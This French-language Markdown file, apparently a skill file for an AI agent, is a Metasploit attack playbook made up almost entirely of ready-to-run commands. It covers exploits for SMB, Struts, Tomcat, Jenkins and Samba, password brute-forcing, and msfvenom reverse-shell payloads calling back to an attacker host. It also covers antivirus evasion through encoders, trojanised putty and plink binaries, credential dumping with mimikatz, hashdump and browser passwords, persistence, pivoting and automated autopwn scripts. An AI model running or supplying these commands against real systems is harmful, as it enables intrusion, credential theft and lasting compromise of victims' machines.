---
name: metasploit-modules
description: Modules Metasploit détaillés — payloads msfvenom, exploits classés par CVE, post-exploitation Meterpreter, modules auxiliary, encoders, et resource scripts avancés.
---

# Metasploit Modules — Guide Approfondi

## Structure des modules

```
/usr/share/metasploit-framework/modules/
├── exploits/       # Code d'exploitation (classé par OS/tech)
├── payloads/       # Code à exécuter sur la cible
├── auxiliary/      # Scan, fuzzing, sniffing, DoS
├── post/           # Post-exploitation (privesc, reco, exfil)
├── encoders/       # Encodage de payloads
├── nops/           # NOP sleds
└── evasion/        # Modules de contournement AV/EDR
```

---

## Modules d'exploit par catégorie

### Windows SMB
```bash
# EternalBlue (MS17-010) — Windows 7/2008 R2/2012
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.5
check
exploit

# MS08-067 — Windows XP/2003 (legacy)
use exploit/windows/smb/ms08_067_netapi
set RHOST 192.168.1.10
set PAYLOAD windows/meterpreter/reverse_tcp
exploit

# SMB login check (legit) + brute
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.1.0/24
set USER_FILE /usr/share/wordlists/users.txt
set PASS_FILE /usr/share/wordlists/rockyou.txt
set STOP_ON_SUCCESS true
run
```

### Web Applications
```bash
# Apache Struts2 RCE (CVE-2017-5638)
use exploit/multi/http/struts2_content_type_ognl
set RHOSTS 192.168.1.10
set TARGETURI /struts2-showcase/
exploit

# WordPress plugin upload
use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS 192.168.1.10
set TARGETURI /wordpress/
set USERNAME admin
set PASSWORD password123
exploit

# Tomcat Manager deploy
use exploit/multi/http/tomcat_mgr_deploy
set RHOSTS 192.168.1.10
set RPORT 8080
set USERNAME tomcat
set PASSWORD tomcat
exploit

# PHPMyAdmin RCE
use exploit/multi/http/phpmyadmin_lfi_rce
set RHOSTS 192.168.1.10
set TARGETURI /phpmyadmin/
exploit

# Jenkins script console
use exploit/multi/http/jenkins_script_console
set RHOSTS 192.168.1.10
set TARGETURI /jenkins/
exploit
```

### Linux / Unix
```bash
# vsFTPd 2.3.4 backdoor
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.1.10
exploit

# Samba usermap script (CVE-2007-2447)
use exploit/multi/samba/usermap_script
set RHOST 192.168.1.10
set PAYLOAD cmd/unix/reverse_netcat
exploit

# ProFTPd mod_copy RCE
use exploit/unix/ftp/proftpd_modcopy_exec
set RHOSTS 192.168.1.10
set TARGETURI /var/www/html/
exploit

# Apache mod_cgi shellshock
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS 192.168.1.10
set TARGETURI /cgi-bin/test
exploit
```

### Database
```bash
# MySQL credentials + SQLi to RCE
use auxiliary/scanner/mysql/mysql_login
set RHOSTS 192.168.1.10
set USERNAME root
set BLANK_PASSWORDS true
run

# MSSQL brute + command execution
use exploit/windows/mssql/mssql_payload
set RHOSTS 192.168.1.10
set USERNAME sa
set PASSWORD admin123
exploit

# PostgreSQL brute
use auxiliary/scanner/postgres/postgres_login
set RHOSTS 192.168.1.0/24
run
```

### Network Devices
```bash
# Cisco Catalyst RCE
use exploit/linux/http/cisco_ucs_rce
set RHOSTS 192.168.1.1
exploit

# Cisco SNMP enum
use auxiliary/scanner/snmp/snmp_login
set RHOSTS 192.168.1.0/24
run
```

### RCE via services courants
```bash
# Java RMI
use exploit/multi/misc/java_rmi_server
set RHOSTS 192.168.1.10
exploit

# GlassFish
use exploit/multi/http/glassfish_deployer
set RHOSTS 192.168.1.10
exploit

# ElasticSearch (CVE-2015-1427)
use exploit/multi/elasticsearch/script_mvel_rce
set RHOSTS 192.168.1.10
exploit

# ShellShock
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS 192.168.1.10
exploit
```

---

## Payloads détaillés — msfvenom

### Génération multiplateforme
```bash
# Linux
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f elf -o payload.elf
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f elf -o shell.elf
msfvenom -p linux/x64/shell/bind_tcp LPORT=4444 -f elf -o bind.elf

# Windows
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o payload.exe
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.5 LPORT=443 -f exe -o https.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 LHOST=10.0.0.5 LPORT=4444 RC4PASSWORD=secret -f exe -o rc4.exe
msfvenom -p windows/x64/shell/bind_tcp LPORT=4444 -f exe -o bind.exe

# macOS
msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f macho -o payload.macho

# Android
msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -o payload.apk

# Web
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f raw -o shell.jsp
msfvenom -p python/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f raw -o shell.py
msfvenom -p nodejs/shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f raw -o shell.js
msfvenom -p cmd/unix/reverse_bash LHOST=10.0.0.5 LPORT=4444 -f raw

# WebAssembly / ASP / WAR
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f asp -o shell.asp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f war -o shell.war
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f psh -o shell.ps1
msfvenom -p python/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f raw -o shell.py
```

### Formats de sortie
```bash
msfvenom --list formats | head -30
# exe, exe-small, elf, elf64, msi, msi64, dll, dll64, apk, jar, war
# asp, aspx, aspx-exe, psh, psh-net, vba, vbs, python, bash, php, perl, ruby
# hex, raw, c, csharp, powershell
```

### Payload stageless (single) vs staged
```bash
# Staged : reverse_tcp (petit stager → télécharge le payload)
msfvenom -p windows/x64/meterpreter/reverse_tcp ... -f exe -o staged.exe
# → ~3-5KB, mais nécessite un handler

# Stageless : meterpreter_reverse_tcp (payload complet)
msfvenom -p windows/x64/meterpreter_reverse_tcp ... -f exe -o stageless.exe
# → ~150KB, tout-en-un, plus stable

# Stageless reverse HTTPS (contourne proxy)
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=10.0.0.5 LPORT=443 -f exe -o stageless_https.exe
```

### Payloads avec encodage
```bash
# Encoder des payloads pour contourner AV basique
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 \
    -e x64/xor_dynamic -i 10 \
    -f exe -o encoded.exe

# Lister les encodeurs
msfvenom -l encoders
# x64/xor_dynamic, x64/zutto_dekiru, x86/shikata_ga_nai, x86/xor_dynamic...

# Shikata ga nai (x86 uniquement)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 \
    -e x86/shikata_ga_nai -i 5 \
    -f exe -o shikata.exe

# Iterations multiples
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 \
    -e x64/xor_dynamic -i 20 \
    -f exe -o heavily_encoded.exe
```

### Payloads avec template personnalisé
```bash
# Utiliser un executable légitime comme template (binding)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 \
    -x /usr/share/windows-binaries/plink.exe \
    -k -f exe -o plink_payload.exe

# Template + encodeur
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 \
    -x /usr/share/windows-binaries/putty.exe \
    -k -e x64/xor_dynamic -i 5 -f exe -o putty_payload.exe
```

---

## Multi/Handler — L'écouteur universel

```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.5
set LPORT 4444
set ExitOnSession false   # Rester en écoute après une session
set EnableStageEncoding true   # Encoder le stager
exploit -j -z             # Lancer en job (arrière-plan)

# Écouter plusieurs payloads simultanément
# Handler 1 : reverse_tcp
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LPORT 4444
exploit -jz

# Handler 2 : reverse_https
set PAYLOAD windows/x64/meterpreter/reverse_https
set LPORT 443
exploit -jz
```

### Handler automatique avec resource script
```bash
cat > handler.rc << 'EOF'
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.5
set LPORT 4444
set ExitOnSession false
set EnableStageEncoding true
set stageserviceretrycount 5
exploit -jz
EOF

msfconsole -r handler.rc
```

---

## Post-exploitation — Modules avancés

### Élévation de privilèges
```bash
# Detection automatique des vulnérabilités de privesc
use post/multi/recon/local_exploit_suggester
set SESSION 1
run

# Windows local exploit
use post/windows/escalate/ms10_015_kitrap0d
set SESSION 1
run

# Get system
meterpreter > getsystem
meterpreter > getprivs    # Voir les privilèges

# Bypass UAC
use exploit/windows/local/bypassuac
set SESSION 1
set LPORT 4445
exploit

# UAC + eventvwr (technique sans module)
use exploit/windows/local/bypassuac_eventvwr
set SESSION 1
exploit

# Escalate via token
use post/windows/escalate/unmarshal_token
set SESSION 1
run
```

### Extraction de credentials
```bash
# Mimikatz (via kiwi)
meterpreter > load kiwi
meterpreter > creds_all
meterpreter > lsa_dump_sam
meterpreter > lsa_dump_secrets
meterpreter > golden_ticket_create -d DOMAIN -k <krbtgt_hash> -u admin -s SID

# Mimikatz (module post)
use post/windows/gather/credentials/mimikatz
set SESSION 1
run

# Hashdump
meterpreter > hashdump
# Ou module post
use post/windows/gather/hashdump
set SESSION 1
run

# Smart hashdump
use post/windows/gather/smart_hashdump
set SESSION 1
run

# Chrome / Firefox passwords
use post/multi/gather/chrome_cookies
set SESSION 1
run

use post/multi/gather/firefox_creds
set SESSION 1
run

# Windows secrets (DPAPI, tokens, etc.)
use post/windows/gather/enum_application
use post/windows/gather/enum_domain_tokens
use post/windows/gather/enum_domain_users
run
```

### Énumération système
```bash
# Windows
use post/windows/gather/enum_logged_on_users
use post/windows/gather/enum_snmp
use post/windows/gather/enum_services
use post/windows/gather/enum_shares
use post/windows/gather/win_privs
use post/windows/gather/arp_scanner
set RHOSTS 192.168.1.0/24
run

# Linux
use post/linux/gather/enum_configs
use post/linux/gather/enum_network
use post/linux/gather/enum_protections
use post/linux/gather/checkvm
use post/linux/gather/checkcontainer
use post/linux/gather/enum_system
set SESSION 1
run
```

### Pivoting
```bash
# Autoroute
meterpreter > run autoroute -s 192.168.1.0/24
meterpreter > run autoroute -p     # Voir les routes

# Port forward
meterpreter > portfwd add -l 3389 -p 3389 -r 192.168.1.100
meterpreter > portfwd add -L 0.0.0.0 -l 8080 -p 80 -r 10.10.10.10

# SOCKS proxy via Metasploit
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 4a
run

# Reverse port forward
meterpreter > portfwd add -R -l 4444 -p 4444 -L 10.0.0.5
```

### Persistance
```bash
# Windows persistence
meterpreter > run persistence -X -i 5 -p 4444 -r 10.0.0.5

# Scheduled task persistence
use post/windows/escalate/scheduled_task
set SESSION 1
set LPORT 4444
set LHOST 10.0.0.5
run

# Registry autorun
meterpreter > reg setval -k HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \
    -d "C:\Windows\System32\evil.exe" -v "Updater"

# WMI persistence
use exploit/windows/local/wmi_persistence
set SESSION 1
set LPORT 4444
run

# Linux persistence (cron, SSH authorized_keys, .bashrc)
meterpreter > run post/linux/manage/sshkey_persistence
set SESSION 1
run

meterpreter > run persistence -X -i 30 -p 4444 -r 10.0.0.5
```

---

## Auxiliary modules — Scan et découverte

### Network discovery
```bash
# ARP sweep (découverte réseau local)
use auxiliary/scanner/discovery/arp_sweep
set RHOSTS 192.168.1.0/24
run

# UDP discovery
use auxiliary/scanner/discovery/udp_probe
set RHOSTS 192.168.1.0/24
run

# UPNP / NetBIOS discovery
use auxiliary/scanner/upnp/ssdp_msearch
use auxiliary/scanner/netbios/nbname
run
```

### Service enumeration
```bash
# SMB
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smb/smb_enumusers
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS 192.168.1.0/24
run

# HTTP
use auxiliary/scanner/http/http_version
use auxiliary/scanner/http/title
use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.1.0/24
run

# FTP
use auxiliary/scanner/ftp/ftp_version
use auxiliary/scanner/ftp/anonymous
set RHOSTS 192.168.1.0/24
run

# SSH
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.0/24
run

# RDP
use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS 192.168.1.0/24
run

# SNMP
use auxiliary/scanner/snmp/snmp_enum
set RHOSTS 192.168.1.0/24
run

# VNC
use auxiliary/scanner/vnc/vnc_none_auth
set RHOSTS 192.168.1.0/24
run
```

### Web fuzzing
```bash
use auxiliary/scanner/http/brute_dirs
set RHOSTS 192.168.1.10
set PATH /site/
run

use auxiliary/scanner/http/files_dir
set RHOSTS 192.168.1.10
run

# SQL injection discovery
use auxiliary/scanner/http/sql_injection
set RHOSTS 192.168.1.10
set GET_PATH /page.php?id=1
run
```

---

## Encoders avancés

```bash
# Lister
msfvenom -l encoders
msfvenom -l encoder_details

# Shikata ga nai (x86, très bon, détecté maintenant)
msfvenom -p windows/meterpreter/reverse_tcp ... -e x86/shikata_ga_nai -i 10

# XOR dynamique (x64)
msfvenom -p windows/x64/meterpreter/reverse_tcp ... -e x64/xor_dynamic -i 10

# Zutto dekiru (japonais, x64)
msfvenom -p windows/x64/meterpreter/reverse_tcp ... -e x64/zutto_dekiru -i 10

# Encodage multiple
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 \
    -e x86/shikata_ga_nai -i 5 \
    -e x86/countdown -i 3 \
    -e x86/jmp_call_additive -i 3 \
    -f exe -o multi_encoded.exe
```

---

## Resource Scripts — Automatisation complète

### Exemple : Auto-exploitation SMB
```bash
cat > smb_autopwn.rc << 'EOF'
workspace -a smb_pentest
db_nmap -sS -sV -p445 --script=smb-* 192.168.1.0/24
use exploit/windows/smb/ms17_010_eternalblue
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.5
set LPORT 4444
set RHOSTS file:/root/smb_hosts.txt
set DisablePayloadHandler false
exploit -jz
use auxiliary/scanner/smb/smb_login
set RHOSTS file:/root/smb_hosts.txt
set USER_FILE /usr/share/wordlists/users.txt
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
EOF
```

### Exemple : Auto-shell Web
```bash
cat > web_autopwn.rc << 'EOF'
workspace -a web_pentest
db_nmap -sS -sV -p80,443,8080,8443 192.168.1.0/24
use auxiliary/scanner/http/title
set RHOSTS file:/root/web_hosts.txt
run
use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS file:/root/wp_hosts.txt
set USERNAME admin
set PASSWORD password123
exploit -jz
EOF
```

### Exemple : Post-exploitation automatique
```bash
cat > auto_post.rc << 'EOF'
use multi/manage/autoroute
set SESSION 1
run
bg
use post/windows/gather/hashdump
set SESSION 1
run
bg
use post/windows/gather/credentials/mimikatz
set SESSION 1
run
bg
use post/windows/escalate/local_exploit_suggester
set SESSION 1
run
EOF
```

---

## Evasion modules

```bash
# Lister les modules d'évasion
use evasion/windows/...
show options

# Windows Syscall evasion
use evasion/windows/defender_evasion
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.5
set LPORT 4444
run
```

---

## Resource scripts avancés : workflow complet

```bash
cat > full_pentest.rc << 'EOF'
# === Phase 1: Reconnaissance ===
workspace -a pentest_client
db_nmap -sS -sV -O -p- -T4 -oA full_scan 192.168.1.0/24

# === Phase 2: Service enumeration ===
db_nmap -sS -sV -p445 --script=smb-vuln-* 192.168.1.0/24
db_nmap -sS -sV -p80,443 --script=http-* 192.168.1.0/24
db_nmap -sU --top-ports 50 192.168.1.0/24

# === Phase 3: Vulnerability analysis ===
vulns
loot -t

# === Phase 4: Exploitation ===
use exploit/windows/smb/ms17_010_eternalblue
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.5
set LPORT 4444
set RHOSTS 192.168.1.10
check
exploit -jz

# === Phase 5: Post-exploitation wait ===
sleep 5
sessions -l
EOF
```

---

## Database intégrée (PostgreSQL)

```bash
# Initialiser
sudo msfdb init
sudo msfdb start

# Dans msfconsole
db_status                          # Vérifier connexion
db_nmap -sV 192.168.1.0/24        # Nmap directement dans la DB
hosts                              # Lister les hôtes découverts
services                           # Lister les services
vulns                              # Vulnérabilités trouvées
loot                               # Résultats d'extraction
notes                              # Notes des modules
creds                              # Credentials collectés

# Importer scans externes
db_import scan.xml                 # Importer Nmap XML
db_import nessus.csv               # Importer Nessus
db_import burp.xml                 # Importer Burp Suite

# Exporter
db_export -f xml /tmp/export.xml
```

---

## Antisèche rapide

```bash
# Générateur de payload (rapide)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o p.exe

# Multi-handler
msfconsole -q -x "use multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.0.0.5; set LPORT 4444; exploit"

# Depuis Meterpreter : récupérer les infos
sysinfo; getuid; getprivs; hashdump; load kiwi; creds_all

# Depuis Meterpreter : pivoter
run autoroute -s 192.168.1.0/24; bg

# Chercher un exploit
search eternalblue
search apache struts
search type:exploit platform:windows cve:2021

# Workspace management
workspace -a projet_client; hosts; services; vulns; loot
```